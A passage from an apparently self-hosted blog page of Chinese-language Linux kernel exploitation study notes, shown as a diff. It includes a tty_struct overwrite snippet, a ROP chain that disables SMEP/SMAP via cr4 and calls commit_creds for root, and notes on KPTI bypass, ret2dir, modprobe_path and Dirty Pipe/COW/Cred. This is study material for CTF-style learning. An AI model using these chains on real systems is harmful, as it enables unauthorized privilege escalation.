+</span><span style="color:#c0c5ce;">    </span><span style="color:#b48ead;">int</span><span style="color:#c0c5ce;"> fd_tty = </span><span style="color:#8fa1b3;">open</span><span style="color:#c0c5ce;">(&quot;</span><span style="color:#a3be8c;">/dev/ptmx</span><span style="color:#c0c5ce;">&quot;, O_RDWR|O_NOCTTY); </span><span style="color:#65737e;">//O_NOCTTY 如果欲打开的文件为终端机设备时, 则不会将该终端机当成进程控制终端机.
+</span><span style="color:#c0c5ce;">    size_t fake_tty_struct[</span><span style="color:#d08770;">4</span><span style="color:#c0c5ce;">] = {</span><span style="color:#d08770;">0</span><span style="color:#c0c5ce;">};
+</span><span style="color:#c0c5ce;">    </span><span style="color:#8fa1b3;">read</span><span style="color:#c0c5ce;">(fd2, fake_tty_struct, </span><span style="color:#d08770;">32</span><span style="color:#c0c5ce;">);
+</span><span style="color:#c0c5ce;">    fake_tty_struct[</span><span style="color:#d08770;">3</span><span style="color:#c0c5ce;">] = (size_t)fake_tty_operations;
+</span><span style="color:#c0c5ce;">    </span><span style="color:#8fa1b3;">write</span><span style="color:#c0c5ce;">(fd2,fake_tty_struct, </span><span style="color:#d08770;">32</span><span style="color:#c0c5ce;">); </span><span style="color:#65737e;">//overwrite
+</span><span style="color:#c0c5ce;">
+</span><span style="color:#c0c5ce;">    </span><span style="color:#b48ead;">char</span><span style="color:#c0c5ce;"> buf[</span><span style="color:#d08770;">0x8</span><span style="color:#c0c5ce;">] = {</span><span style="color:#d08770;">0</span><span style="color:#c0c5ce;">};
+</span><span style="color:#c0c5ce;">    </span><span style="color:#8fa1b3;">write</span><span style="color:#c0c5ce;">(fd_tty, buf, </span><span style="color:#d08770;">8</span><span style="color:#c0c5ce;">); </span><span style="color:#65737e;">//trigger
+</span><span style="color:#c0c5ce;">    </span><span style="color:#b48ead;">return </span><span style="color:#d08770;">0</span><span style="color:#c0c5ce;">;
+</span><span style="color:#c0c5ce;">}
+</span></pre>
+<h1 id="bypass-smap">bypass smap</h1><p>cr4寄存器第21位</p>
+<ul>
+<li>1：0x6f0设置cr4，smap和smep都会被关闭</li>
+<li>2：调用copy_from_user和copy_to_user来访问用户态的内存</li>
+</ul>
+<h1 id="bypass-kpti">bypass kpti</h1><p>KPTI(Kernel page-table isolation)内核页表隔离，把进程页表按照成用户态、内核态独立的分割成两份，为了杜绝用户态通过一些旁路漏洞来窃取内核态的数据。</p>
+<p>找符号<code>swapgs_restore_regs_and_return_to_usermode</code></p>
+<pre style="background-color:#2b303b;">
+<span style="color:#c0c5ce;">pwndbg&gt; x/40i 0xffffffff9e200ff0
+</span><span style="color:#c0c5ce;">   0xffffffff9e200ff0:	jmp    0xffffffff9e20100b
+</span><span style="color:#c0c5ce;">   0xffffffff9e200ff2:	mov    ecx,0x48
+</span><span style="color:#c0c5ce;">   0xffffffff9e200ff7:	mov    rdx,QWORD PTR gs:0x17bc8
+</span><span style="color:#c0c5ce;">   0xffffffff9e201000:	and    edx,0xfffffffe
+</span><span style="color:#c0c5ce;">   0xffffffff9e201003:	mov    eax,edx
+</span><span style="color:#c0c5ce;">   0xffffffff9e201005:	shr    rdx,0x20
+</span><span style="color:#c0c5ce;">   0xffffffff9e201009:	wrmsr  
+</span><span style="color:#c0c5ce;">   0xffffffff9e20100b:	nop    DWORD PTR [rax+rax*1+0x0]
+</span><span style="color:#c0c5ce;">   0xffffffff9e201010:	pop    r15
+</span><span style="color:#c0c5ce;">   0xffffffff9e201012:	pop    r14
+</span><span style="color:#c0c5ce;">   0xffffffff9e201014:	pop    r13
+</span><span style="color:#c0c5ce;">   0xffffffff9e201016:	pop    r12
+</span><span style="color:#c0c5ce;">   0xffffffff9e201018:	pop    rbp
+</span><span style="color:#c0c5ce;">   0xffffffff9e201019:	pop    rbx
+</span><span style="color:#c0c5ce;">   0xffffffff9e20101a:	pop    r11
+</span><span style="color:#c0c5ce;">   0xffffffff9e20101c:	pop    r10
+</span><span style="color:#c0c5ce;">   0xffffffff9e20101e:	pop    r9
+</span><span style="color:#c0c5ce;">   0xffffffff9e201020:	pop    r8
+</span><span style="color:#c0c5ce;">   0xffffffff9e201022:	pop    rax
+</span><span style="color:#c0c5ce;">   0xffffffff9e201023:	pop    rcx
+</span><span style="color:#c0c5ce;">   0xffffffff9e201024:	pop    rdx
+</span><span style="color:#c0c5ce;">   0xffffffff9e201025:	pop    rsi
+</span><span style="color:#c0c5ce;">   0xffffffff9e201026:	mov    rdi,rsp
+</span><span style="color:#c0c5ce;">   0xffffffff9e201029:	mov    rsp,QWORD PTR gs:0x6004
+</span><span style="color:#c0c5ce;">   0xffffffff9e201032:	push   QWORD PTR [rdi+0x30]
+</span><span style="color:#c0c5ce;">   0xffffffff9e201035:	push   QWORD PTR [rdi+0x28]
+</span><span style="color:#c0c5ce;">   0xffffffff9e201038:	push   QWORD PTR [rdi+0x20]
+</span><span style="color:#c0c5ce;">   0xffffffff9e20103b:	push   QWORD PTR [rdi+0x18]
+</span><span style="color:#c0c5ce;">   0xffffffff9e20103e:	push   QWORD PTR [rdi+0x10]
+</span><span style="color:#c0c5ce;">   0xffffffff9e201041:	push   QWORD PTR [rdi]
+</span><span style="color:#c0c5ce;">   0xffffffff9e201043:	push   rax
+</span><span style="color:#c0c5ce;">   0xffffffff9e201044:	xchg   ax,ax
+</span><span style="color:#c0c5ce;">   0xffffffff9e201046:	mov    rdi,cr3
+</span><span style="color:#c0c5ce;">   0xffffffff9e201049:	jmp    0xffffffff9e20107f
+</span><span style="color:#c0c5ce;">   0xffffffff9e20104b:	mov    rax,rdi
+</span><span style="color:#c0c5ce;">   0xffffffff9e20104e:	and    rdi,0x7ff
+</span><span style="color:#c0c5ce;">   0xffffffff9e201055:	bt     QWORD PTR gs:0x2b756,rdi
+</span><span style="color:#c0c5ce;">   0xffffffff9e20105f:	jae    0xffffffff9e201070
+</span><span style="color:#c0c5ce;">   0xffffffff9e201061:	btr    QWORD PTR gs:0x2b756,rdi
+</span><span style="color:#c0c5ce;">   0xffffffff9e20106b:	mov    rdi,rax
+</span></pre>
+<p>rop跳转执行连续的pop指令的下一条地址，即<code>0xffffffff9e201026:	mov    rdi,rsp</code></p>
+<pre style="background-color:#2b303b;">
+<span style="color:#c0c5ce;">size_t rop[</span><span style="color:#d08770;">0x500</span><span style="color:#c0c5ce;">];
+</span><span style="color:#8fa1b3;">memset</span><span style="color:#c0c5ce;">((</span><span style="color:#b48ead;">char</span><span style="color:#c0c5ce;">*)rop, </span><span style="color:#d08770;">0</span><span style="color:#c0c5ce;">, </span><span style="color:#d08770;">0x500</span><span style="color:#c0c5ce;">);
+</span><span style="color:#b48ead;">int</span><span style="color:#c0c5ce;"> i = </span><span style="color:#d08770;">0</span><span style="color:#c0c5ce;">;
+</span><span style="color:#c0c5ce;">rop[i++] = prdi_r;
+</span><span style="color:#c0c5ce;">rop[i++] = </span><span style="color:#d08770;">0x6f0</span><span style="color:#c0c5ce;">;
+</span><span style="color:#c0c5ce;">rop[i++] = mov_cr4_rdi;
+</span><span style="color:#c0c5ce;">rop[i++] = prdi_r;
+</span><span style="color:#c0c5ce;">rop[i++] = init_cred;
+</span><span style="color:#c0c5ce;">rop[i++] = commit_creds;
+</span><span style="color:#c0c5ce;">rop[i++] = swapgs_restore_regs_and_return_to_usermode;
+</span><span style="color:#c0c5ce;">rop[i++] = </span><span style="color:#d08770;">0</span><span style="color:#c0c5ce;">;
+</span><span style="color:#c0c5ce;">rop[i++] = </span><span style="color:#d08770;">0</span><span style="color:#c0c5ce;">;
+</span><span style="color:#c0c5ce;">rop[i++] = (size_t)getshell;
+</span><span style="color:#c0c5ce;">rop[i++] = user_cs;
+</span><span style="color:#c0c5ce;">rop[i++] = user_rflags;
+</span><span style="color:#c0c5ce;">rop[i++] = user_sp;
+</span><span style="color:#c0c5ce;">rop[i++] = user_ss;
+</span></pre>
+<h1 id="double-fetch">double fetch</h1><p>条件竞争</p>
+<h1 id="ret2dir">ret2dir</h1><p>是一种绕过smap/smep和pxn防护的攻击方法</p>
+<p>需要知道linux的内存布局（https://elixir.bootlin.com/linux/v5.0/source/Documentation/x86/x86_64/mm.txt）</p>
+<pre style="background-color:#2b303b;">
+<span style="color:#c0c5ce;">========================================================================================================================
+</span><span style="color:#c0c5ce;">    Start addr    |   Offset   |     End addr     |  Size   | VM area description
+</span><span style="color:#c0c5ce;">========================================================================================================================
+</span><span style="color:#c0c5ce;">                  |            |                  |         |
+</span><span style="color:#c0c5ce;"> 0000000000000000 |    0       | 00007fffffffffff |  128 TB | user-space virtual memory, different per mm
+</span><span style="color:#c0c5ce;">__________________|____________|__________________|_________|___________________________________________________________
+</span><span style="color:#c0c5ce;">                  |            |                  |         |
+</span><span style="color:#c0c5ce;"> 0000800000000000 | +128    TB | ffff7fffffffffff | ~16M TB | ... huge, almost 64 bits wide hole of non-canonical
+</span><span style="color:#c0c5ce;">                  |            |                  |         |     virtual memory addresses up to the -128 TB
+</span><span style="color:#c0c5ce;">                  |            |                  |         |     starting offset of kernel mappings.
+</span><span style="color:#c0c5ce;">__________________|____________|__________________|_________|___________________________________________________________
+</span><span style="color:#c0c5ce;">                                                            |
+</span><span style="color:#c0c5ce;">                                                            | Kernel-space virtual memory, shared between all processes:
+</span><span style="color:#c0c5ce;">____________________________________________________________|___________________________________________________________
+</span><span style="color:#c0c5ce;">                  |            |                  |         |
+</span><span style="color:#c0c5ce;"> ffff800000000000 | -128    TB | ffff87ffffffffff |    8 TB | ... guard hole, also reserved for hypervisor
+</span><span style="color:#c0c5ce;"> ffff880000000000 | -120    TB | ffff887fffffffff |  0.5 TB | LDT remap for PTI
+</span><span style="color:#c0c5ce;"> ffff888000000000 | -119.5  TB | ffffc87fffffffff |   64 TB | direct mapping of all physical memory (page_offset_base)
+</span><span style="color:#c0c5ce;"> ffffc88000000000 |  -55.5  TB | ffffc8ffffffffff |  0.5 TB | ... unused hole
+</span><span style="color:#c0c5ce;"> ffffc90000000000 |  -55    TB | ffffe8ffffffffff |   32 TB | vmalloc/ioremap space (vmalloc_base)
+</span><span style="color:#c0c5ce;"> ffffe90000000000 |  -23    TB | ffffe9ffffffffff |    1 TB | ... unused hole
+</span><span style="color:#c0c5ce;"> ffffea0000000000 |  -22    TB | ffffeaffffffffff |    1 TB | virtual memory map (vmemmap_base)
+</span><span style="color:#c0c5ce;"> ffffeb0000000000 |  -21    TB | ffffebffffffffff |    1 TB | ... unused hole
+</span><span style="color:#c0c5ce;"> ffffec0000000000 |  -20    TB | fffffbffffffffff |   16 TB | KASAN shadow memory
+</span><span style="color:#c0c5ce;">__________________|____________|__________________|_________|____________________________________________________________
+</span><span style="color:#c0c5ce;">                                                            |
+</span><span style="color:#c0c5ce;">                                                            | Identical layout to the 56-bit one from here on:
+</span><span style="color:#c0c5ce;">____________________________________________________________|____________________________________________________________
+</span><span style="color:#c0c5ce;">                  |            |                  |         |
+</span><span style="color:#c0c5ce;"> fffffc0000000000 |   -4    TB | fffffdffffffffff |    2 TB | ... unused hole
+</span><span style="color:#c0c5ce;">                  |            |                  |         | vaddr_end for KASLR
+</span><span style="color:#c0c5ce;"> fffffe0000000000 |   -2    TB | fffffe7fffffffff |  0.5 TB | cpu_entry_area mapping
+</span><span style="color:#c0c5ce;"> fffffe8000000000 |   -1.5  TB | fffffeffffffffff |  0.5 TB | ... unused hole
+</span><span style="color:#c0c5ce;"> ffffff0000000000 |   -1    TB | ffffff7fffffffff |  0.5 TB | %esp fixup stacks
+</span><span style="color:#c0c5ce;"> ffffff8000000000 | -512    GB | ffffffeeffffffff |  444 GB | ... unused hole
+</span><span style="color:#c0c5ce;"> ffffffef00000000 |  -68    GB | fffffffeffffffff |   64 GB | EFI region mapping space
+</span><span style="color:#c0c5ce;"> ffffffff00000000 |   -4    GB | ffffffff7fffffff |    2 GB | ... unused hole
+</span><span style="color:#c0c5ce;"> ffffffff80000000 |   -2    GB | ffffffff9fffffff |  512 MB | kernel text mapping, mapped to physical address 0
+</span><span style="color:#c0c5ce;"> ffffffff80000000 |-2048    MB |                  |         |
+</span><span style="color:#c0c5ce;"> ffffffffa0000000 |-1536    MB | fffffffffeffffff | 1520 MB | module mapping space
+</span><span style="color:#c0c5ce;"> ffffffffff000000 |  -16    MB |                  |         |
+</span><span style="color:#c0c5ce;">    FIXADDR_START | ~-11    MB | ffffffffff5fffff | ~0.5 MB | kernel-internal fixmap range, variable size and offset
+</span><span style="color:#c0c5ce;"> ffffffffff600000 |  -10    MB | ffffffffff600fff |    4 kB | legacy vsyscall ABI
+</span><span style="color:#c0c5ce;"> ffffffffffe00000 |   -2    MB | ffffffffffffffff |    2 MB | ... unused hole
+</span><span style="color:#c0c5ce;">__________________|____________|__________________|_________|___________________________________________________________
+</span></pre>
+<p><code>physmap </code>就是我们要找的直接映射区域在<code>0xffff888000000000 - 0xffffc87fffffffff</code> 这一段，大小为 64TB</p>
+<p>这段内存的定义：
+physmap:内核空间中一个大的，连续的虚拟内存空间它映射了部分或所有(取决于具体架构)的物理内存</p>
+<p>也就是说这块地方是物理内存会直接映射到这64TB 里面的某个地方，不同架构映射可能会有所不同
+这样要找到物理内存的一个位置，只需要做简单的线性加减就完事了，速度和效率都比较高</p>
+<p>目前linux 内核多使用 伙伴系统 + slub 分配器 来做内存分配（https://blog.csdn.net/lukuen/article/details/6935068）</p>
+<p>linux 内核内存分配主要有 kmalloc 和 vmalloc 两种方式</p>
+<p><code>vmalloc</code> 请求页的倍数大小的内存，要保证虚拟地址连续，物理地址不需要连续
+<code>kmalloc</code> 内存在字节级做分配，要保证 虚拟地址和物理地址都是连续的</p>
+<p>kmalloc 也就是我们的slub分配器使用的方式，也是内核用到更多的方式</p>
+<p>很容易想到slub分配器可以在physmap上做内存分配操作，例如要分配 0x200 大小的内存，那么就会找kmalloc-512 ，最后这块内存是在physmap 里面的</p>
+<p>通过上面的描述我们可以知道</p>
+<p>physmap 和 ram 是直接的映射关系，可以通过 slub 分配的内存地址找到 physmap 的位置</p>
+<p>ret2dir 主要是用来绕过内核 smep, smap 的限制</p>
+<p>加上了 smep,smap 保护之后，内核态不能直接执行用户态的代码</p>
+<p>但是用户态分配的内存，也会停留在 ram 中，这块内存在 physmap中是可以看到的，可以通过mmap分配大量的内存，这样找到的概率就会比较大</p>
+<p>早期physmap是可执行的，于是可以在用户态写好shellcode, 然后劫持内核之后跳到 physmap 对应的位置就完事了，不用去管smep,smap</p>
+<p>后面加上了一些保护策略（W^X w 和 x 不能同时存在等）,physmap 不可执行，但是仍然可以通过 rop 之类的方式进行利用</p>
+<p>okay, 总结一下利用过程</p>
+<p>1 mmap 大量的内存(rop chains 等)，提高命中的概率
+2 泄露出 slab 的地址，计算出 physmap的地址
+3 劫持内核执行流到 physmap 上</p>
+<h1 id="modprobe-pathti-quan">modprobe_path提权</h1><p>modprobe用于在Linux内核中添加一个可加载的内核模块，或者从内核中移除一个可加载的内核模块，它是我们在Linux内核中安装或卸载新模块时都要执行的一个程序。该程序的路径是一个内核全局变量，默认为/sbin/modprobe，我们可以通过运行<code>cat /proc/sys/kernel/modprobe</code>查看该路径</p>
+<p>这个路径是可写的，普通用户也是可以更改它的
+而当内核运行一个错误格式的文件（或未知文件类型的文件）的时候，也会调用这个 modprobe_path所指向的程序。如果我们将这个字符串指向我们自己的sh文件 ，并使用 system或 execve 去执行一个未知文件类型的错误文件，那么在发生错误的时候就可以执行我们自己的二进制文件了</p>
+<p>利用kpti_trampoline返回用户态</p>
+<h2 id="bu-chong">补充</h2><p>kernel中的mod_tree处存放着各个加载模块的地址；cat /proc/kallsyms | grep mod_tree即可</p>
+<h1 id="selinux">SELinux</h1><h1 id="dirty-cow">dirty cow</h1><p>Dirty COW漏洞是一种发生在写时复制的竞态条件漏洞，它影响所有基于Linux的操作系统，包括Android，这个漏洞2007年起就存在于Linux内核中，直到2016年才被发现和修复。可以利用这个漏洞修改受保护的文件，也可以利用这个漏洞提权。</p>
+<h1 id="dirty-pipe">dirty pipe</h1><p>使用pipe read/write，我们可以让目标pipe的每个pipe buffer都带上<code>PIPE_BUF_FLAG_CAN_MERGE</code>flag。之后打开目标文件，并使用splice 写到之前处理过的pipe中，splice底层会帮助我们把目标文件的page cache 设置到pipe buffer的page字段，但却没有修改flags字段。之后我们再调用pipe write时由于存在<code>PIPE_BUF_FLAG_CAN_MERGE</code>flag字段，内容会接着上次被写入同一个page中，但page其实已经变成了目标文件的page cache，导致直接修改了目标文件page cache。如果之后有其他文件尝试读取这个文件，kernel会优先返回cache中的内容，也就是被我们修改后的page cache。但由于这个修改并不会触发page的dirty属性，因此若由于内存紧张后或系统重启等原因，就会导致这个cache内kernel丢弃，再次读取文件内核就会重新从磁盘中取出未被我们修改的内容（这就是和脏牛的不同点）。</p>
+<h1 id="dirty-cred">dirty cred</h1><p>主要涉及对creds和file结构的替换，creds中存放着uid、gid的信息，file结构是当前操作的文件，包括读写权限等，当对文件操作通过权限校验后，把对应的file结构替换成一个缺少权限的文件可以实现越权读写</p>
+<p>4.13前可以用userfaultfd延长内核时间窗口（权限校验-&gt;获取用户输入-&gt;实际写入操作）
+4.13后无法用userfaultfd延长内核时间窗口（获取用户输入-&gt;权限校验-&gt;实际写入操作）</p>
+<p>inode机制：同时只能由一个进程向一个目标文件写内容，其他写入操作需要等待解锁（权限校验不需要等待锁）。故可以通过写超长内容来延长时间</p>
+</main>
+                <aside class="toc-sidebar">
+                    <div class="toc-sticky-container">
+                        <div class="toc-header">:: Contents ::</div>
+                        <ul class="toc-list"><li class="toc-item toc-h1" data-level="1" style="margin-left:12px"><a href="#kernelru-men-bi-ji">kernel入门笔记</a></li><li class="toc-item toc-h2" data-level="2" style="margin-left:12px"><a href="#ji-chu-zhi-shi">基础知识</a></li><li class="toc-item toc-h2" data-level="2" style="margin-left:12px"><a href="#kernel">Kernel</a></li><li class="toc-item toc-h2" data-level="2" style="margin-left:12px"><a href="#ring-model">Ring Model</a></li><li class="toc-item toc-h2" data-level="2" style="margin-left:12px"><a href="#loadable-kernel-modules-lkms">Loadable Kernel Modules(LKMs)</a></li><li class="toc-item toc-h3" data-level="3" style="margin-left:12px"><a href="#xiang-guan-zhi-ling">相关指令</a></li><li class="toc-item toc-h2" data-level="2" style="margin-left:12px"><a href="#syscall">syscall</a></li><li class="toc-item toc-h2" data-level="2" style="margin-left:12px"><a href="#ioctl">ioctl</a></li><li class="toc-item toc-h2" data-level="2" style="margin-left:12px"><a href="#zhuang-tai-qie-huan">状态切换</a></li><li class="toc-item toc-h3" data-level="3" style="margin-left:12px"><a href="#user-space-to-kernel-space">user space to kernel space</a></li><li class="toc-item toc-h3" data-level="3" style="margin-left:12px"><a href="#kernel-space-to-user-space">kernel space to user space</a></li><li class="toc-item toc-h3" data-level="3" style="margin-left:12px"><a href="#struct-cred">struct cred</a></li><li class="toc-item toc-h2" data-level="2" style="margin-left:12px"><a href="#nei-he-tai-han-shu">内核态函数</a></li><li class="toc-item toc-h1" data-level="1" style="margin-left:12px"><a href="#pwncollege-bi-ji">pwncollege 笔记</a></li><li class="toc-item toc-h1" data-level="1" style="margin-left:12px"><a href="#chang-yong-ming-ling">常用命令</a></li><li class="toc-item toc-h1" data-level="1" style="margin-left:12px"><a href="#diao-shi-jiao-ben">调试脚本</a></li><li class="toc-item toc-h1" data-level="1" style="margin-left:12px"><a href="#shang-chuan">上传</a></li><li class="toc-item toc-h2" data-level="2" style="margin-left:12px"><a href="#muslbian-yi">musl编译</a></li><li class="toc-item toc-h1" data-level="1" style="margin-left:12px"><a href="#smepxiang-guan">smep相关</a></li><li class="toc-item toc-h1" data-level="1" style="margin-left:12px"><a href="#fei-yu-qi">非预期</a></li><li class="toc-item toc-h1" data-level="1" style="margin-left:12px"><a href="#du-wen-jian-rao-kaslr">读文件绕kaslr</a></li><li class="toc-item toc-h2" data-level="2" style="margin-left:12px"><a href="#kallsymsquan-0">kallsyms全0</a></li><li class="toc-item toc-h1" data-level="1" style="margin-left:12px"><a href="#fgkaslr">FGKASLR</a></li><li class="toc-item toc-h2" data-level="2" style="margin-left:12px"><a href="#jian-jie">简介</a></li><li class="toc-item toc-h2" data-level="2" style="margin-left:12px"><a href="#shi-xian">实现</a></li><li class="toc-item toc-h3" data-level="3" style="margin-left:12px"><a href="#bian-yi-jie-duan">编译阶段</a></li><li class="toc-item toc-h3" data-level="3" style="margin-left:12px"><a href="#jia-zai-jie-duan">加载阶段</a></li><li class="toc-item toc-h1" data-level="1" style="margin-left:12px"><a href="#pxn">PXN</a></li><li class="toc-item toc-h1" data-level="1" style="margin-left:12px"><a href="#rop">ROP</a></li><li class="toc-item toc-h2" data-level="2" style="margin-left:12px"><a href="#qian-qi">前期</a></li><li class="toc-item toc-h2" data-level="2" style="margin-left:12px"><a href="#exp">exp</a></li><li class="toc-item toc-h1" data-level="1" style="margin-left:12px"><a href="#ret2usr">ret2usr</a></li><li class="toc-item toc-h1" data-level="1" style="margin-left:12px"><a href="#bypass-smep">bypass smep</a></li><li class="toc-item toc-h2" data-level="2" style="margin-left:12px"><a href="#si-lu">思路</a></li><li class="toc-item toc-h2" data-level="2" style="margin-left:12px"><a href="#exp">exp</a></li><li class="toc-item toc-h1" data-level="1" style="margin-left:12px"><a href="#bypass-smap">bypass smap</a></li><li class="toc-item toc-h1" data-level="1" style="margin-left:12px"><a href="#bypass-kpti">bypass kpti</a></li><li class="toc-item toc-h1" data-level="1" style="margin-left:12px"><a href="#double-fetch">double fetch</a></li><li class="toc-item toc-h1" data-level="1" style="margin-left:12px"><a href="#ret2dir">ret2dir</a></li><li class="toc-item toc-h1" data-level="1" style="margin-left:12px"><a href="#modprobe-pathti-quan">modprobe_path提权</a></li><li class="toc-item toc-h2" data-level="2" style="margin-left:12px"><a href="#bu-chong">补充</a></li><li class="toc-item toc-h1" data-level="1" style="margin-left:12px"><a href="#selinux">SELinux</a></li><li class="toc-item toc-h1" data-level="1" style="margin-left:12px"><a href="#dirty-cow">dirty cow</a></li><li class="toc-item toc-h1" data-level="1" style="margin-left:12px"><a href="#dirty-pipe">dirty pipe</a></li><li class="toc-item toc-h1" data-level="1" style="margin-left:12px"><a href="#dirty-cred">dirty cred</a></li></ul>
+                    </div>
+                </aside>
+            </div> 
+    <footer style="margin-top: 50px; border-top: 1px solid #333; padding-top: 20px; font-size: 0.8rem; color: #555; text-align: center;">
+        Built with Rust. <span style="color: #66ed59;">EOF</span>
+    </footer>
+    <button id="back-to-top" aria-label="Back to Top">^TOP</button>
+    <script src="script.js"></script>
+</body>
+</html>
